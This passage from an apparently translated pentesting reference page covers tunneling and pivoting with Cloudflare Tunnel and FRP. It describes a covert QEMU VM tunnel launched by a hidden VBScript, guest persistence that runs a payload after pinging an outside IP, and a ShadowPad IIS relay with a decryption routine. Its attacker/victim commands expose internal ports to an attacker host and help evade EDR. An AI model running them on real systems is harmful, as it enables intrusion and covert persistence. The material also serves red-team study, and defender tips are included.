로컬에서 관리되는 터널 구성은 아래와 같이 소문자로 된 `tunnel`, `credentials-file`, `url` 키를 사용합니다.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
커넥터 시작:
```bash
cloudflared tunnel run mytunnel
```
Connector는 outbound connection을 설정하며, 기본적으로 HTTP/2로 fallback하는 QUIC를 협상합니다. 모든 deployment가 TCP/443을 사용한다고 가정하지 마세요. deployment에 필요한 권한만 사용하여 실행하세요.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp)는 **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX, XTCP**를 지원하는 Go reverse proxy입니다. XTCP는 성공 여부가 NAT에 따라 달라지는 P2P hole punching을 사용합니다. **v0.53.0**부터는 **SSH Tunnel Gateway**로 작동할 수 있으므로, target host는 `frpc` binary 없이 기본 OpenSSH client를 사용할 수 있습니다.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 새로운 SSH gateway 사용 (frpc binary 없음)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
위 명령은 `frps`가 gateway를 제공하는 동안 stock OpenSSH client를 사용하여 victim의 **8080** port를 **attacker_ip:9000**으로 publish합니다.<sup>[[50]](#references)</sup>

## QEMU를 사용한 은밀한 VM 기반 Tunnel

QEMU user-mode networking은 virtual network에 root 또는 administrator privilege를 요구하지 않으며, `-netdev user,hostfwd=...`는 host에서 guest로 TCP, UDP 또는 UNIX connection을 redirect합니다.<sup>[[51]](#references)</sup> TrustedSec은 host-focused EDR이 guest 내부의 activity를 놓칠 수 있었던 incident에서 Tiny Core QEMU VM과 reverse SSH tunnel 시도를 문서화했습니다.<sup>[[1]](#references)</sup>

### 빠른 한 줄 명령
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 위 명령은 게스트 메모리 256MiB와 qcow2 디스크 이미지를 사용하는 **Tiny Core Linux** 게스트를 시작합니다. 디스크 이미지는 인-RAM 디스크가 아닙니다.
• Windows 호스트의 **2222/tcp** 포트는 게스트 내부의 **22/tcp**로 투명하게 포워딩됩니다.
• 공격자의 관점에서 대상은 단순히 2222 포트를 노출합니다. 해당 포트에 도달하는 모든 패킷은 VM에서 실행 중인 SSH 서버가 처리합니다.

### VBScript를 통한 은밀한 실행

TrustedSec은 위 d 사건에서 VBS로 구동되는 QEMU 실행과 Tiny Core 이미지를 관찰했습니다.<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs`로 스크립트를 실행하면 창이 계속 숨겨진 상태로 유지됩니다.<sup>[[1]](#references)</sup>

### 게스트 내부 persistence

d incident는 `/opt/bootlocal.sh` 및 `/opt/filetool.lst`를 통한 stateless Tiny Core guest의 persistence를 설명합니다.<sup>[[1]](#references)</sup>

1. payload를 `/opt/123.out`에 저장합니다.
2. `/opt/bootlocal.sh`에 다음을 추가합니다.

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc`와 `opt`를 `/opt/filetool.lst`에 추가하여 종료 시 payload가 `mydata.tgz`에 패키징되도록 합니다.

### Telemetry 고려 사항

• host에는 여전히 QEMU process, qcow2 image 및 host-forwarded listener가 노출됩니다.
• host 전용 process scan에서는 guest process를 검사하지 않을 수 있지만, virtualization이 항상 evasion을 보장하는 것은 아닙니다. network, QEMU 및 image telemetry를 통해 여전히 노출될 수 있습니다.<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 팁

• user-writable path에 있는 **예상치 못한 QEMU/VirtualBox/KVM binary**를 alert합니다.
• `qemu-system*.exe`에서 시작되는 outbound connection을 차단합니다.
• QEMU launch 직후 binding되는 드문 listening port(2222, 10022, …)를 hunt합니다.

## `HttpAddUrl`을 통한 IIS/HTTP.sys relay node (ShadowPad)

Check Point는 ShadowPad의 IIS module이 `HttpAddUrl`을 통해 URL prefix를 binding하여 침해된 perimeter web server를 backdoor 및 relay node로 전환한다고 설명합니다.<sup>[[3]](#references)</sup>

동일한 report에서는 아래에 요약된 default, wildcard listener, packet decryption, relay queue 및 debug telemetry를 자세히 설명합니다.<sup>[[3]](#references)</sup>

* **Config defaults** – module의 JSON config에서 값이 생략되면 신뢰할 만한 IIS default(`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`)로 fallback합니다. 이를 통해 benign traffic에는 IIS가 올바른 branding으로 응답합니다.
* **Wildcard interception** – operator는 URL prefix의 세미콜론으로 구분된 목록(host 및 path의 wildcard 포함)을 제공합니다. module은 각 entry에 대해 `HttpAddUrl`을 호출하므로 HTTP.sys가 일치하는 request를 malicious handler로 routing하고, 일치하지 않는 request는 일반적인 IIS 동작으로 fallback합니다.
* **Encrypted first packet** – request body의 처음 2바이트가 custom 32-bit PRNG의 seed를 전달합니다. 이후 모든 byte는 protocol parsing 전에 생성된 keystream과 XOR됩니다.

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module은 두 개의 list를 유지합니다. 하나는 “servers”(upstream node)이고 다른 하나는 “clients”(downstream implant)입니다. 약 30초 이내에 heartbeat가 도착하지 않으면 entry가 정리됩니다. 두 list가 모두 비어 있지 않으면 첫 번째 healthy server와 첫 번째 healthy client를 pairing하고, 한쪽이 connection을 close할 때까지 두 socket 사이에서 byte를 단순히 pipe합니다.
* **Debug telemetry** – optional logging은 각 pairing에 대해 source IP, destination IP 및 total forwarded byte를 기록합니다. investigator들은 이러한 breadcrumb를 사용하여 여러 victim에 걸쳐 구성된 ShadowPad mesh를 재구성했습니다.

---

## 확인할 기타 tool

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Shadow에 숨기: QEMU Virtualization을 통한 Covert Tunnel](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 이전: Storm-2603의 이전 Ransomware Operation 분석](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragon 내부: Stealthy Offensive Operation의 Relay Network 및 내부 동작 공개](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Firewall/IDS Restriction 우회](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Metasploit의 Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - 구현 및 사양](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
